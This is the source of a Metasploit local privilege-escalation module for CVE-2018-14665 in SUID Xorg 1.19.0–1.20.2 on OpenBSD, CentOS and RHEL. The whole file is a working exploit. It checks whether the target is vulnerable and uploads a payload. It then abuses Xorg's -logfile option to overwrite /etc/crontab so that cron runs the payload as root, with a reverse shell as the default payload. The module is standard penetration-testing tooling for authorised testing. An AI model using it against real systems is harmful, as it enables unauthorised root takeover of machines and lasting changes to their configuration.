##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Xorg X11 Server SUID logfile Privilege Escalation',
        'Description' => %q{
          This module attempts to gain root privileges with SUID Xorg X11 server
          versions 1.19.0 < 1.20.3.

          A permission check flaw exists for -modulepath and -logfile options when
          starting Xorg. This allows unprivileged users that can start the server
          the ability to elevate privileges and run arbitrary code under root
          privileges.

          This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and
          CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS
          and RHEL systems requires console auth for the user's session to start
          the Xorg server.

          Cron launches the payload, so if SELinux is enforcing, exploitation
          may still be possible, but the module will bail.

          Xorg must have SUID permissions and may not start if already running.

          On exploitation a crontab.old backup file will be created by Xorg.
          This module will remove the .old file and restore crontab after
          successful exploitation. Failed exploitation may result in a corrupted
          crontab. On successful exploitation artifacts will be created consistant
          with starting Xorg and running a cron.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Narendra Shinde', # Discovery and exploit
          'Raptor - 0xdea',  # Modified exploit for cron
          'Aaron Ringo',     # Metasploit module
          'bcoles'           # Metasploit module
        ],
        'DisclosureDate' => '2018-10-25',
        'References' => [
          [ 'CVE', '2018-14665' ],
          [ 'BID', '105741' ],
          [ 'EDB', '45697' ],
          [ 'EDB', '45742' ],
          [ 'EDB', '45832' ],
          [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html' ],
          [ 'URL', 'https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm' ]
        ],
        'Platform' => %w[openbsd linux],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'SessionTypes' => %w[shell meterpreter],
        'Targets' => [
          [
            'OpenBSD', {
              'Platform' => 'unix',
              'Arch' => [ ARCH_CMD ]
            }
          ],
          [
            'Linux x64', {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X64 ]
            }
          ],
          [
            'Linux x86', {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X86 ]
            }
          ]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/unix/reverse_openssl',
          'WfsDelay' => 120
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => [ UNRELIABLE_SESSION ],
          'Stability' => [ CRASH_SERVICE_DOWN ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ]
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_execute
            ]
          }
        }
      )
    )

    register_advanced_options(
      [
        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
        OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ]),
        OptBool.new('ConsoleLock', [ true, 'Will check for console lock on linux systems', true ])
      ]
    )
  end

  def check
    # linux checks
    uname = cmd_exec('uname')
    if uname =~ /linux/i
      vprint_status 'Running additional check for Linux'
      if datastore['ConsoleLock']
        user = cmd_exec('id -un')
        unless exist?("/var/run/console/#{user}")
          vprint_error("No console lock for #{user}")
          return CheckCode::Safe
        end
        vprint_good("Console lock for #{user}")
      end

      return CheckCode::Safe('SELinux is enforcing') if selinux_installed? && selinux_enforcing?

      vprint_good('SELinux is not an issue')
    end

    # suid program check
    xorg_path = cmd_exec('command -v Xorg')
    unless xorg_path.include?('Xorg')
      return CheckCode::Safe('Could not find Xorg executable')
    end

    vprint_good("Xorg path found at #{xorg_path}")

    unless setuid?(xorg_path)
      return CheckCode::Safe("Xorg binary #{xorg_path} is not SUID")
    end

    vprint_good("Xorg binary #{xorg_path} is SUID")

    # version check
    x_version = cmd_exec 'Xorg -version'
    if x_version.include?('Release Date')
      v = Rex::Version.new(x_version.scan(/\d\.\d+\.\d+/).first)
      unless v.between?(Rex::Version.new('1.19.0'), Rex::Version.new('1.20.2'))
        vprint_error "Xorg version #{v} not supported"
        return CheckCode::Safe
      end
    elsif x_version.include?('Fatal server error')
      vprint_error 'User probably does not have console auth'
      vprint_error 'Below is Xorg -version output'
      vprint_error x_version
      return CheckCode::Safe
    else
      vprint_warning('Could not parse Xorg -version output')
      return CheckCode::Appears
    end
    vprint_good("Xorg version #{v} is vulnerable")

    # process check for /X
    proc_list = cmd_exec 'ps ax'
    if proc_list.include?('/X ')
      vprint_warning('Xorg in process list')
      return CheckCode::Appears
    end
    vprint_good('Xorg does not appear running')
    return CheckCode::Vulnerable
  end

  def on_new_session(session)
    if session.type.to_s.eql? 'meterpreter'
      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
      session.sys.process.execute '/bin/sh', "-c \"#{@clean_up}\""
    else
      session.shell_command(@clean_up)
    end
    print_good 'Returning session after cleaning'
  ensure
    super
  end

  def exploit
    check_status = check
    if check_status == CheckCode::Appears
      print_warning 'Could not get version or Xorg process possibly running, may fail'
    elsif check_status == CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end

    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end

    print_good 'Passed all initial checks for exploit'

    pscript = "#{datastore['WritableDir']}/.session-#{rand_text_alphanumeric 5..10}"
    @clean_up = "/bin/cat #{pscript}.b > /etc/crontab ; /bin/rm -f #{pscript}.b /etc/crontab.old"
    xdisplay = datastore['Xdisplay']

    # Uploading file crontab will run
    print_status 'Uploading your payload, this could take a while'
    if payload.arch.first == 'cmd'
      write_file(pscript, payload.encoded)
    else
      write_file(pscript, generate_payload_exe)
    end
    register_file_for_cleanup pscript
    chmod pscript

    # Exploit steps on crontab so backing it up
    cmd_exec "cat /etc/crontab > #{pscript}.b"
    # Actual exploit with cron overwrite
    print_status 'Trying /etc/crontab overwrite'
    cmd_exec "cd /etc ; Xorg -fp '* * * * * root #{pscript}' -logfile crontab #{xdisplay} & >/dev/null"
    Rex.sleep 5
    cmd_exec 'pkill Xorg'
    Rex.sleep 1
    cron_check = cmd_exec "grep -F #{pscript} /etc/crontab"
    unless cron_check.include? pscript
      rm_f "#{pscript}.b"
      print_error 'Deleting crontab backup'
      fail_with Failure::NotVulnerable, '/etc/crontab not modified'
    end
    print_good '/etc/crontab overwrite successful. Waiting for job to run (may take a minute)...'
  end
end
